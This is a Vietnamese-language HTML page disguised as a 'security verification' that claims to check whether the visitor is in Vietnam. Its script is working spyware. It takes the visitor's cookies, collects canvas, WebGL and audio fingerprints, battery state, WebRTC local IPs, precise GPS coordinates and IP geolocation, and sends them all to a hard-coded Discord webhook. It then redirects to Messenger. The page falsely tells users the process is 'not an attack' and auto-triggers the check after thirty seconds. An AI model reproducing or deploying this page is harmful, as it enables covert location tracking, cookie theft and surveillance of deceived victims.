<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Xác minh bảo mật…</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; background: #0c0f14; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
        #jackLayer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
            background: rgba(0,0,0,0.96); backdrop-filter: blur(20px);
            display: flex; justify-content: center; align-items: center; flex-direction: column;
            color: #e4e6eb; text-align: center; transition: opacity 0.3s;
        }
        .shield-icon {
            width: 80px; height: 80px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23ffbe0b"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
            margin-bottom: 20px;
        }
        .progress-container {
            width: 260px; height: 6px; background: rgba(255,255,255,0.08); border-radius: 6px;
            margin: 20px 0; overflow: hidden;
        }
        .progress-bar {
            height: 100%; width: 0%; background: linear-gradient(90deg, #ffbe0b, #ff8800);
            border-radius: 6px; transition: width 0.2s;
        }
        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; color: #ffbe0b; }
        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; line-height: 1.4; }
        .tap-area {
            margin-top: 30px; padding: 12px 36px; background: rgba(255,190,11,0.12);
            border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
            animation: pulse 2s infinite; border: 1px solid rgba(255,190,11,0.3);
            font-size: 15px; letter-spacing: 0.5px;
        }
        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.04); } 100% { opacity: 1; transform: scale(1); } }
        .checkmark {
            width: 70px; height: 70px; border-radius: 50%; background: #00c853;
            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
            box-shadow: 0 0 25px rgba(0,200,83,0.5); animation: pop 0.4s ease;
        }
        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .checkmark::after {
            content: ''; display: block; width: 18px; height: 30px; border: solid white;
            border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
        }
        .crossmark {
            width: 70px; height: 70px; border-radius: 50%; background: #ff1744;
            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
            box-shadow: 0 0 25px rgba(255,23,68,0.5); animation: pop 0.4s ease;
            position: relative;
        }
        .crossmark::after, .crossmark::before {
            content: ''; position: absolute; width: 35px; height: 5px; background: white;
            border-radius: 2px;
        }
        .crossmark::after { transform: rotate(45deg); }
        .crossmark::before { transform: rotate(-45deg); }
        .hidden { display: none; }
        .action-btn {
            margin-top: 15px; padding: 10px 28px; background: rgba(255,255,255,0.1);
            border-radius: 50px; color: #ffbe0b; font-weight: 600; cursor: pointer;
            border: 1px solid rgba(255,190,11,0.3); font-size: 14px;
            display: inline-block; margin: 10px 5px;
        }
        .action-btn.secondary {
            background: rgba(255,255,255,0.05);
            color: #ccc;
        }
    </style>
</head>
<body>
    <div id="jackLayer">
        <div id="wheelSection">
            <div class="shield-icon"></div>
            <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar" style="width:0%"></div>
            </div>
            <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;">
                Nhấn để xác minh bạn là người Việt Nam
            </div>
            <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
        </div>

        <div id="resultSection" class="hidden">
            <div id="resultMark"></div>
            <div class="status" id="resultStatus"></div>
            <div class="sub" id="resultSub"></div>
            <div id="actionButtons"></div>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';

        const statusEl = document.getElementById('statusMsg');
        const subEl = document.getElementById('subMsg');
        const progressBar = document.getElementById('progressBar');
        const tapBtn = document.getElementById('tapButton');
        const tapPrompt = document.getElementById('tapPrompt');
        const wheelSection = document.getElementById('wheelSection');
        const resultSection = document.getElementById('resultSection');
        const resultMark = document.getElementById('resultMark');
        const resultStatus = document.getElementById('resultStatus');
        const resultSub = document.getElementById('resultSub');
        const actionButtons = document.getElementById('actionButtons');

        let gpsData = null;
        let ipData = null;
        const cookiesStolen = document.cookie || 'none';

        // Get device model from user agent
        function getDeviceModel(ua) {
            const modelRegex = /(?:SAMSUNG|Samsung|SM-)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)?)|(?:Galaxy\s+([A-Za-z0-9]+))|(?:iPhone\s+(\d{1,2}(?:\s*(Pro|Max|Plus))?))/i;
            const match = ua.match(modelRegex);
            if (match) {
                if (match[1]) return 'Samsung ' + match[1];
                if (match[2]) return 'Galaxy ' + match[2];
                if (match[3]) return 'iPhone ' + match[3];
            }
            // fallback: common patterns
            if (/SM-[A-Z0-9]+/i.test(ua)) {
                return ua.match(/SM-[A-Z0-9]+/i)[0];
            }
            if (/Redmi/i.test(ua)) return ua.match(/Redmi [^;]+/i)[0] || 'Xiaomi';
            if (/POCOPHONE/i.test(ua)) return 'Poco Phone';
            return 'Unknown';
        }

        function getFingerprint() {
            const nav = navigator;
            const ua = nav.userAgent;
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 280; canvas.height = 60;
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 100);
            let webglRenderer = 'N/A', webglVendor = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
                }
            } catch(e) {}
            let audioFP = 'N/A';
            try {
                const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = actx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, actx.currentTime);
                const comp = actx.createDynamicsCompressor();
                osc.connect(comp); comp.connect(actx.destination);
                osc.start(0);
                actx.startRendering();
                actx.oncomplete = (e) => {
                    const out = e.renderedBuffer.getChannelData(0);
                    audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                };
            } catch(e) {}
            const conn = nav.connection || {};
            return {
                userAgent: ua,
                language: nav.language,
                platform: nav.platform,
                deviceModel: getDeviceModel(ua),
                deviceMemory: nav.deviceMemory || 'N/A',
                hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
                touchSupport: ('ontouchstart' in window),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                connection: conn.effectiveType || 'N/A',
                canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
                cookies: cookiesStolen,
                battery: null
            };
        }

        async function fetchIP() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json?token=0',
                'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,query'
            ];
            for (let url of apis) {
                try {
                    const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
                    const d = await r.json();
                    const out = {
                        ip: d.ip || d.query || '',
                        city: d.city || '',
                        region: d.region || d.regionName || '',
                        country: d.country || d.country_name || '',
                        countryCode: d.countryCode || (d.country_code ? d.country_code : ''),
                        lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
                        lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
                        isp: d.isp || d.org || ''
                    };
                    if (out.ip && out.country) return out;
                } catch(e) {}
            }
            return null;
        }

        function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (m) ips.add(m[0]);
                };
                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
            });
        }

        function forceGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'unsupported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy),
                        error: null
                    }),
                    err => resolve({ error: err.code }),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function sendData() {
            const fp = getFingerprint();
            if ('getBattery' in navigator) {
                try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
            }
            const localIPs = await getWebRTCIPs();
            const embed = {
                title: '📱 **Thiết bị & Vị trí**',
                color: 0xffa502,
                fields: [
                    { name: '📱 Model điện thoại', value: fp.deviceModel, inline: true },
                    { name: '📍 GPS', value: gpsData && !gpsData.error ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : (gpsData ? 'Lỗi: ' + gpsData.error : 'Không có'), inline: true },
                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nQuốc gia: ${ipData.country}\nThành phố: ${ipData.city}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
                    { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                    { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
                    { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
                    { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
                    { name: '🖥 Màn hình', value: fp.screen, inline: true },
                    { name: '📶 Kết nối', value: fp.connection, inline: true },
                    { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
                    { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
                    { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                    { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                ],
                footer: { text: 'Axr4t2auYc • Hệ thống tự động' },
                timestamp: new Date().toISOString()
            };
            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
        }

        function isInsideVietnam(lat, lon) {
            return typeof lat === 'number' && typeof lon === 'number' && lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
        }

        function showResult(type, message, subMessage, buttons = []) {
            wheelSection.classList.add('hidden');
            resultSection.classList.remove('hidden');
            if (type === 'success') {
                resultMark.innerHTML = '<div class="checkmark"></div>';
            } else {
                resultMark.innerHTML = '<div class="crossmark"></div>';
            }
            resultStatus.textContent = message;
            resultSub.textContent = subMessage;
            actionButtons.innerHTML = '';
            buttons.forEach(btn => {
                const el = document.createElement('button');
                el.className = 'action-btn' + (btn.secondary ? ' secondary' : '');
                el.textContent = btn.label;
                el.onclick = btn.onClick;
                actionButtons.appendChild(el);
            });
        }

        function openLocationSettings() {
            if (/Android/.test(navigator.userAgent)) {
                window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
            } else {
                alert('Vui lòng mở Cài đặt > Quyền riêng tư > Dịch vụ vị trí và bật vị trí cho trình duyệt.');
            }
        }

        function retry() {
            resultSection.classList.add('hidden');
            wheelSection.classList.remove('hidden');
            progressBar.style.width = '100%';
            statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
            subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
            tapPrompt.classList.remove('hidden');
            tapBtn.classList.remove('hidden');
        }

        async function startVerification() {
            tapBtn.classList.add('hidden');
            tapPrompt.classList.add('hidden');
            statusEl.textContent = 'Đang kiểm tra quốc gia…';
            subEl.textContent = 'Hệ thống tự động – không phải tấn công';
            let percent = 0;
            const fakeInterval = setInterval(() => {
                percent += 5;
                progressBar.style.width = percent + '%';
                if (percent >= 100) {
                    clearInterval(fakeInterval);
                    progressBar.style.width = '100%';
                }
            }, 80);

            const gpsPromise = forceGPS();
            ipData = await fetchIP();
            const gpsResult = await gpsPromise;

            clearInterval(fakeInterval);
            progressBar.style.width = '100%';

            gpsData = gpsResult;

            let isVietnam = false;
            if (gpsData && !gpsData.error && gpsData.lat != null && gpsData.lon != null) {
                isVietnam = isInsideVietnam(gpsData.lat, gpsData.lon);
            } else {
                if (ipData) {
                    const country = ipData.country || '';
                    isVietnam = country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
                }
            }

            await sendData();

            if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
                showResult(
                    'error',
                    'Không thể lấy vị trí',
                    'Vui lòng bật dịch vụ vị trí và cho phép quyền truy cập vị trí cho trình duyệt.',
                    [
                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings },
                        { label: 'Thử lại', onClick: retry, secondary: true }
                    ]
                );
                return;
            }

            if (isVietnam) {
                showResult(
                    'success',
                    'Xác minh thành công!',
                    'Bạn là người Việt Nam, được phép truy cập. Đang chuyển hướng…',
                    []
                );
                setTimeout(() => {
                    window.location.href = 'https://www.messenger.com/';
                }, 2000);
            } else {
                showResult(
                    'error',
                    'Truy cập bị từ chối',
                    'Quốc gia của bạn không được phép. Hệ thống chỉ chấp nhận người dùng Việt Nam.',
                    [
                        { label: 'Thử lại', onClick: () => window.location.reload() }
                    ]
                );
            }
        }

        // Initial progress bar fill
        let progress = 0;
        const wheelTimer = setInterval(() => {
            progress += 5;
            progressBar.style.width = progress + '%';
            if (progress >= 100) {
                clearInterval(wheelTimer);
                progressBar.style.width = '100%';
                statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
                subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
                tapPrompt.classList.remove('hidden');
                tapBtn.classList.remove('hidden');
            }
        }, 80);

        tapBtn.addEventListener('click', startVerification);

        setTimeout(() => {
            if (!tapBtn.classList.contains('hidden')) tapBtn.click();
        }, 30000);
    </script>
</body>
</html>
